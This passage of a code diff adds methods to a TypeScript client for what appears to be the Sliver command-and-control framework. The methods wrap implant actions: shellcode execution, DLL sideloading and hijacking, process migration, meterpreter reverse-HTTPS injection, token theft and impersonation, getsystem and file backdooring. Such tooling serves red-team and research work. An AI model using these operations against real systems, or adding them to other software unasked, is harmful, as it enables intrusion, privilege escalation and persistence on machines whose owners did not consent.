++      this.m4SessionRequest(sessionId, timeoutSeconds),
++      shellcode,
++      options,
++      timeoutSeconds,
++    );
++  }
++
++  executeShellcodeBeacon(
++    beaconId: string,
++    shellcode: Buffer,
++    options: ExecuteShellcodeOptions = {},
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.executeShellcodeTarget(
++      this.m4BeaconRequest(beaconId, timeoutSeconds),
++      shellcode,
++      options,
++      timeoutSeconds,
++    );
++  }
++
++  private sideloadTarget(
++    request: CommonRequest,
++    data: Buffer,
++    options: SideloadOptions,
++    timeoutSeconds: number,
++  ) {
++    return withTimeoutSignal(timeoutSeconds, async (signal) => {
++      const ownedData = m4ArtifactCopy(data, "Sideload library");
++      try {
++        return await this.artifactRpc.sideload(
++          {
++            Data: ownedData,
++            ProcessName: options.processName ?? "c:\\windows\\system32\\notepad.exe",
++            Args: m4StringArray(options.args),
++            EntryPoint: options.entryPoint ?? "",
++            Kill: !(options.keepAlive ?? false),
++            isDLL: options.isDll ?? false,
++            isUnicode: options.isUnicode ?? false,
++            PPid: boundedUint32(options.parentPid ?? 0, "Parent process id"),
++            ProcessArgs: options.processArgs === undefined ? [""] : m4StringArray(options.processArgs),
++            Request: request,
++          },
++          { signal },
++        );
++      } finally {
++        ownedData.fill(0);
++      }
++    });
++  }
++
++  sideloadSession(
++    sessionId: string,
++    data: Buffer,
++    options: SideloadOptions = {},
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.sideloadTarget(this.m4SessionRequest(sessionId, timeoutSeconds), data, options, timeoutSeconds);
++  }
++
++  sideloadBeacon(
++    beaconId: string,
++    data: Buffer,
++    options: SideloadOptions = {},
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.sideloadTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), data, options, timeoutSeconds);
++  }
++
++  private spawnDllTarget(
++    request: CommonRequest,
++    data: Buffer,
++    options: SpawnDllOptions,
++    timeoutSeconds: number,
++  ) {
++    return withTimeoutSignal(timeoutSeconds, async (signal) => {
++      const ownedData = m4ArtifactCopy(data, "Reflective DLL");
++      try {
++        return await this.artifactRpc.spawnDll(
++          {
++            Data: ownedData,
++            ProcessName: options.processName ?? "c:\\windows\\system32\\notepad.exe",
++            Args: m4StringArray(options.args),
++            EntryPoint: options.entryPoint ?? "ReflectiveLoader",
++            Kill: !(options.keepAlive ?? false),
++            PPid: 0,
++            ProcessArgs: [],
++            Request: request,
++          },
++          { signal },
++        );
++      } finally {
++        ownedData.fill(0);
++      }
++    });
++  }
++
++  spawnDllSession(
++    sessionId: string,
++    data: Buffer,
++    options: SpawnDllOptions = {},
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.spawnDllTarget(this.m4SessionRequest(sessionId, timeoutSeconds), data, options, timeoutSeconds);
++  }
++
++  spawnDllBeacon(
++    beaconId: string,
++    data: Buffer,
++    options: SpawnDllOptions = {},
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.spawnDllTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), data, options, timeoutSeconds);
++  }
++
++  getShellcodeEncoderMap(timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
++    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.shellcodeEncoderMap({}, { signal }));
++  }
++
++  private migrateTarget(request: CommonRequest, options: MigrateOptions, timeoutSeconds: number) {
++    const pid = boundedUint32(options.pid ?? 0, "Migration process id");
++    const processName = options.processName?.trim() ?? "";
++    if (pid === 0 && processName === "") {
++      throw new Error("Migration requires either a process id or process name");
++    }
++    const config = m4ImplantConfig(options.config);
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.migrate(
++        {
++          Pid: pid,
++          Config: config,
++          Encoder: options.encoder ?? ShellcodeEncoder.NONE,
++          Name: options.name,
++          ProcName: processName,
++          Request: request,
++        },
++        { signal },
++      ),
++    );
++  }
++
++  migrateSession(
++    sessionId: string,
++    options: MigrateOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.migrateTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  migrateBeacon(
++    beaconId: string,
++    options: MigrateOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.migrateTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  private msfTarget(request: CommonRequest, options: MsfOptions, timeoutSeconds: number) {
++    assertNonEmptyString(options.lhost, "Metasploit listen host");
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.msf(
++        {
++          Payload: options.payload ?? "meterpreter_reverse_https",
++          LHost: options.lhost,
++          LPort: boundedPort(options.lport ?? 4444, "Metasploit listen port"),
++          Encoder: options.encoder ?? "",
++          Iterations: boundedInt32(options.iterations ?? 1, "Metasploit encoder iterations"),
++          Request: request,
++        },
++        { signal },
++      ),
++    );
++  }
++
++  msfSession(sessionId: string, options: MsfOptions, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
++    return this.msfTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  msfBeacon(beaconId: string, options: MsfOptions, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
++    return this.msfTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  private msfRemoteTarget(request: CommonRequest, options: MsfRemoteOptions, timeoutSeconds: number) {
++    assertNonEmptyString(options.lhost, "Metasploit listen host");
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.msfRemote(
++        {
++          Payload: options.payload ?? "meterpreter_reverse_https",
++          LHost: options.lhost,
++          LPort: boundedPort(options.lport ?? 4444, "Metasploit listen port"),
++          Encoder: options.encoder ?? "",
++          Iterations: boundedInt32(options.iterations ?? 1, "Metasploit encoder iterations"),
++          PID: boundedUint32(options.pid, "Metasploit injection process id"),
++          Request: request,
++        },
++        { signal },
++      ),
++    );
++  }
++
++  msfRemoteSession(
++    sessionId: string,
++    options: MsfRemoteOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.msfRemoteTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  msfRemoteBeacon(
++    beaconId: string,
++    options: MsfRemoteOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.msfRemoteTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  runSshSession(
++    sessionId: string,
++    options: SshCommandOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    assertNonEmptyString(options.username, "SSH username");
++    assertNonEmptyString(options.hostname, "SSH hostname");
++    if (options.kerberosRealm && !options.kerberosKeytab) {
++      throw new Error("A Kerberos realm requires a keytab");
++    }
++
++    return withTimeoutSignal(timeoutSeconds, async (signal) => {
++      const ownedPrivateKey = m4SecretCopy(options.privateKey, "SSH private key");
++      const ownedKeytab = m4SecretCopy(options.kerberosKeytab, "Kerberos keytab");
++      try {
++        return await this.rpc.runSSHCommand(
++          {
++            Username: options.username,
++            Hostname: options.hostname,
++            Port: boundedPort(options.port ?? 22, "SSH port"),
++            Command: Array.isArray(options.command) ? options.command.join(" ") : (options.command ?? ""),
++            Password: options.password ?? "",
++            PrivKey: ownedPrivateKey,
++            Krb5Conf: options.kerberosConfigPath ?? "/etc/krb5.conf",
++            Keytab: ownedKeytab,
++            Realm: options.kerberosRealm ?? "",
++            Request: this.m4SessionRequest(sessionId, timeoutSeconds),
++          },
++          { signal },
++        );
++      } finally {
++        ownedPrivateKey.fill(0);
++        ownedKeytab.fill(0);
++      }
++    });
++  }
++
++  startRemoteServiceSession(
++    sessionId: string,
++    options: StartRemoteServiceOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    assertBoundedNonEmptyString(
++      options.hostname,
++      "Remote service hostname",
++      M4_REMOTE_HOSTNAME_MAX_CHARACTERS,
++    );
++    assertBoundedNonEmptyString(
++      options.serviceName,
++      "Remote service name",
++      M4_REMOTE_SERVICE_NAME_MAX_CHARACTERS,
++    );
++    assertBoundedNonEmptyString(
++      options.serviceDescription,
++      "Remote service description",
++      M4_REMOTE_SERVICE_DESCRIPTION_MAX_CHARACTERS,
++    );
++    assertBoundedNonEmptyString(
++      options.binaryPath,
++      "Remote service binary path",
++      M4_REMOTE_COMMAND_LINE_MAX_CHARACTERS,
++    );
++    assertBoundedString(
++      options.args ?? "",
++      "Remote service arguments",
++      M4_REMOTE_COMMAND_LINE_MAX_CHARACTERS,
++    );
++
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.startService(
++        {
++          ServiceName: options.serviceName,
++          ServiceDescription: options.serviceDescription,
++          BinPath: options.binaryPath,
++          Hostname: options.hostname,
++          Arguments: options.args ?? "",
++          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
++        },
++        { signal },
++      ),
++    );
++  }
++
++  removeRemoteServiceSession(
++    sessionId: string,
++    options: RemoveRemoteServiceOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    assertBoundedNonEmptyString(
++      options.hostname,
++      "Remote service hostname",
++      M4_REMOTE_HOSTNAME_MAX_CHARACTERS,
++    );
++    assertBoundedNonEmptyString(
++      options.serviceName,
++      "Remote service name",
++      M4_REMOTE_SERVICE_NAME_MAX_CHARACTERS,
++    );
++
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.removeService(
++        {
++          ServiceInfo: {
++            Hostname: options.hostname,
++            ServiceName: options.serviceName,
++          },
++          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
++        },
++        { signal },
++      ),
++    );
++  }
++
++  private runAsTarget(request: CommonRequest, options: RunAsOptions, timeoutSeconds: number) {
++    assertNonEmptyString(options.username, "Run-as username");
++    assertNonEmptyString(options.processName, "Run-as process path");
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.runAs(
++        {
++          Username: options.username,
++          ProcessName: options.processName,
++          Args: options.args ?? "",
++          Domain: options.domain ?? "",
++          Password: options.password ?? "",
++          HideWindow: !(options.showWindow ?? false),
++          NetOnly: options.netOnly ?? false,
++          Request: request,
++        },
++        { signal },
++      ),
++    );
++  }
++
++  runAsSession(
++    sessionId: string,
++    options: RunAsOptions,
++    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
++  ) {
++    return this.runAsTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  runAsBeacon(
++    beaconId: string,
++    options: RunAsOptions,
++    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
++  ) {
++    return this.runAsTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  private makeTokenTarget(request: CommonRequest, options: MakeTokenOptions, timeoutSeconds: number) {
++    assertNonEmptyString(options.username, "Token username");
++    assertNonEmptyString(options.password, "Token password");
++    const logonType = options.logonType ?? 9;
++    if (!isWindowsLogonType(logonType)) throw new Error("Unsupported Windows logon type");
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.makeToken(
++        {
++          Username: options.username,
++          Password: options.password,
++          Domain: options.domain ?? "",
++          LogonType: logonType,
++          Request: request,
++        },
++        { signal },
++      ),
++    );
++  }
++
++  makeTokenSession(
++    sessionId: string,
++    options: MakeTokenOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.makeTokenTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  makeTokenBeacon(
++    beaconId: string,
++    options: MakeTokenOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.makeTokenTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  private impersonateTarget(request: CommonRequest, username: string, timeoutSeconds: number) {
++    assertNonEmptyString(username, "Impersonation username");
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.impersonate({ Username: username, Request: request }, { signal }),
++    );
++  }
++
++  impersonateSession(
++    sessionId: string,
++    username: string,
++    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
++  ) {
++    return this.impersonateTarget(this.m4SessionRequest(sessionId, timeoutSeconds), username, timeoutSeconds);
++  }
++
++  impersonateBeacon(
++    beaconId: string,
++    username: string,
++    timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS,
++  ) {
++    return this.impersonateTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), username, timeoutSeconds);
++  }
++
++  revToSelfSession(sessionId: string, timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS) {
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.revToSelf({ Request: this.m4SessionRequest(sessionId, timeoutSeconds) }, { signal }),
++    );
++  }
++
++  revToSelfBeacon(beaconId: string, timeoutSeconds = M4_IDENTITY_TIMEOUT_SECONDS) {
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.revToSelf({ Request: this.m4BeaconRequest(beaconId, timeoutSeconds) }, { signal }),
++    );
++  }
++
++  getSystemSession(
++    sessionId: string,
++    options: GetSystemOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    const config = m4ImplantConfig(options.config);
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.getSystem(
++        {
++          HostingProcess: options.hostingProcess ?? "spoolsv.exe",
++          Config: config,
++          Name: "",
++          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
++        },
++        { signal },
++      ),
++    );
++  }
++
++  getPrivsSession(sessionId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.getPrivs({ Request: this.m4SessionRequest(sessionId, timeoutSeconds) }, { signal }),
++    );
++  }
++
++  getPrivsBeacon(beaconId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.getPrivs({ Request: this.m4BeaconRequest(beaconId, timeoutSeconds) }, { signal }),
++    );
++  }
++
++  backdoorSession(
++    sessionId: string,
++    options: BackdoorOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    assertNonEmptyString(options.filePath, "Backdoor remote file path");
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.backdoor(
++        {
++          FilePath: options.filePath,
++          ProfileName: options.profileName ?? "",
++          Name: options.name ?? "",
++          Request: this.m4SessionRequest(sessionId, timeoutSeconds),
++        },
++        { signal },
++      ),
++    );
++  }
++
++  hijackDllSession(
++    sessionId: string,
++    options: HijackDllOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    assertNonEmptyString(options.referenceDllPath, "Reference DLL path");
++    assertNonEmptyString(options.targetLocation, "DLL target location");
++    if (options.targetDll && options.profileName) {
++      throw new Error("DLL hijack accepts either target DLL bytes or a profile, not both");
++    }
++
++    return withTimeoutSignal(timeoutSeconds, async (signal) => {
++      const ownedReferenceDll = m4ArtifactCopy(options.referenceDll, "Reference DLL");
++      const ownedTargetDll = m4ArtifactCopy(options.targetDll, "Target DLL");
++      try {
++        return await this.artifactRpc.hijackDLL(
++          {
++            ReferenceDLLPath: options.referenceDllPath,
++            TargetLocation: options.targetLocation,
++            ReferenceDLL: ownedReferenceDll,
++            TargetDLL: ownedTargetDll,
++            ProfileName: options.profileName ?? "",
++            Name: options.name ?? "",
++            Request: this.m4SessionRequest(sessionId, timeoutSeconds),
++          },
++          { signal },
++        );
++      } finally {
++        ownedReferenceDll.fill(0);
++        ownedTargetDll.fill(0);
++      }
++    });
++  }
++
 +  killSession(sessionId: string, force = false, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Empty> {
 +    return withTimeoutSignal(timeoutSeconds, (signal) =>
 +      this.rpc.kill(
@@ -1503,32 +2373,27 @@ index c2baf89..4dc189d 100644
 +  }
 +
 +  stageImplantBuild(buildNames: string[], timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
-+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
-+      await this.rpc.stageImplantBuild({ Build: buildNames }, { signal });
-+    });
-+  }
-+
-+  implantBuilds(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+     return withTimeoutSignal(timeoutSeconds, async (signal) => {
+       await this.rpc.stageImplantBuild({ Build: buildNames }, { signal });
+     });
+   }
+
+   implantBuilds(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.implantBuilds(this.empty, { signal }));
 +    return withTimeoutSignal(timeoutSeconds, (signal) => this.inventoryRpc.implantBuilds(this.empty, { signal }));
-+  }
-+
-+  deleteImplantBuild(name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
-+    return withTimeoutSignal(timeoutSeconds, async (signal) => {
-+      await this.rpc.deleteImplantBuild({ Name: name }, { signal });
-+    });
-+  }
-+
-+  canaries(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
-+    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.canaries(this.empty, { signal }));
-+  }
-+
+   }
+
+   deleteImplantBuild(name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
+@@ -784,7 +2515,7 @@ export class SliverClient {
+   }
+
    implantProfiles(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
 -    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.implantProfiles(this.empty, { signal }));
 +    return withTimeoutSignal(timeoutSeconds, (signal) => this.inventoryRpc.implantProfiles(this.empty, { signal }));
    }
 
    saveImplantProfile(profile: ImplantProfile, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
-@@ -799,17 +1655,17 @@ export class SliverClient {
+@@ -799,17 +2530,17 @@ export class SliverClient {
 
    lootAll(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
      return withTimeoutSignal(timeoutSeconds, async (signal) => {
@@ -1549,7 +2414,7 @@ index c2baf89..4dc189d 100644
    }
 
    lootRemove(lootId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
-@@ -819,18 +1675,18 @@ export class SliverClient {
+@@ -819,18 +2550,18 @@ export class SliverClient {
    }
 
    lootContent(lootId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
@@ -1571,7 +2436,7 @@ index c2baf89..4dc189d 100644
    }
 
    websiteRemove(name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
-@@ -841,13 +1697,13 @@ export class SliverClient {
+@@ -841,13 +2572,13 @@ export class SliverClient {
 
    websiteAddContent(name: string, contents: Record<string, WebContent>, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
      return withTimeoutSignal(timeoutSeconds, (signal) =>
@@ -1587,7 +2452,7 @@ index c2baf89..4dc189d 100644
      );
    }
 
-@@ -859,17 +1715,17 @@ export class SliverClient {
+@@ -859,17 +2590,17 @@ export class SliverClient {
 
    // --- High-level helpers (ergonomic wrappers) ---
 
@@ -1608,7 +2473,7 @@ index c2baf89..4dc189d 100644
      const res = await this.getBeacons(timeoutSeconds);
      return res.Beacons;
    }
-@@ -879,19 +1735,384 @@ export class SliverClient {
+@@ -879,19 +2610,467 @@ export class SliverClient {
      return res.Active;
    }
 
@@ -1842,6 +2707,89 @@ index c2baf89..4dc189d 100644
 +
 +function assertNonEmptyString(value: string, label: string): void {
 +  if (typeof value !== "string" || !value.trim()) throw new Error(`${label} must not be empty`);
++}
++
++function assertBoundedString(value: string, label: string, maxCharacters: number): void {
++  if (typeof value !== "string") throw new Error(`${label} must be a string`);
++  if (value.length > maxCharacters) {
++    throw new Error(`${label} must not exceed ${maxCharacters} characters`);
++  }
++}
++
++function assertBoundedNonEmptyString(value: string, label: string, maxCharacters: number): void {
++  assertNonEmptyString(value, label);
++  assertBoundedString(value, label, maxCharacters);
++}
++
++function boundedUint32(value: number, label: string): number {
++  if (!Number.isSafeInteger(value) || value < 0 || value > 0xffff_ffff) {
++    throw new Error(`${label} must be an unsigned 32-bit integer`);
++  }
++  return value;
++}
++
++function boundedInt32(value: number, label: string): number {
++  if (!Number.isSafeInteger(value) || value < 0 || value > 0x7fff_ffff) {
++    throw new Error(`${label} must be a non-negative 32-bit integer`);
++  }
++  return value;
++}
++
++function boundedPort(value: number, label: string): number {
++  if (!Number.isSafeInteger(value) || value < 1 || value > 65_535) {
++    throw new Error(`${label} must be between 1 and 65535`);
++  }
++  return value;
++}
++
++function m4StringArray(values: string[] | undefined): string[] {
++  if (values === undefined) return [];
++  if (!Array.isArray(values) || values.some((value) => typeof value !== "string")) {
++    throw new Error("Arguments must be an array of strings");
++  }
++  return [...values];
++}
++
++function m4Environment(env: Readonly<Record<string, string>> | undefined): Record<string, string> {
++  if (env === undefined) return {};
++  const result: Record<string, string> = {};
++  for (const [name, value] of Object.entries(env)) {
++    assertNonEmptyString(name, "Environment variable name");
++    if (typeof value !== "string") throw new Error("Environment variable values must be strings");
++    result[name] = value;
++  }
++  return result;
++}
++
++function m4ArtifactCopy(data: Buffer | undefined, label: string): Buffer {
++  if (data === undefined) return Buffer.alloc(0);
++  if (!Buffer.isBuffer(data)) throw new Error(`${label} must be bytes`);
++  assertBoundedArtifact(data, label);
++  return Buffer.from(data);
++}
++
++function m4SecretCopy(data: Buffer | undefined, label: string): Buffer {
++  if (data === undefined) return Buffer.alloc(0);
++  if (!Buffer.isBuffer(data)) throw new Error(`${label} must be bytes`);
++  if (data.length > M4_SECRET_MAX_PAYLOAD_BYTES) {
++    throw new Error(`${label} exceeds the ${M4_SECRET_MAX_PAYLOAD_BYTES}-byte secret limit`);
++  }
++  return Buffer.from(data);
++}
++
++function m4ImplantConfig(config: ImplantConfig): ImplantConfig {
++  if (!config || typeof config !== "object") throw new Error("Implant configuration is required");
++  return {
++    ...config,
++    C2: config.C2.map((c2) => ({ ...c2 })),
++    CanaryDomains: [...config.CanaryDomains],
++    Assets: [...config.Assets],
++    HTTPC2ConfigName: config.HTTPC2ConfigName || "default",
++  };
++}
++
++function isWindowsLogonType(value: number): value is WindowsLogonType {
++  return value === 2 || value === 3 || value === 4 || value === 5 || value === 7 || value === 8 || value === 9;
 +}
 +
 +function shellTerminalDimension(value: number, label: string): number {
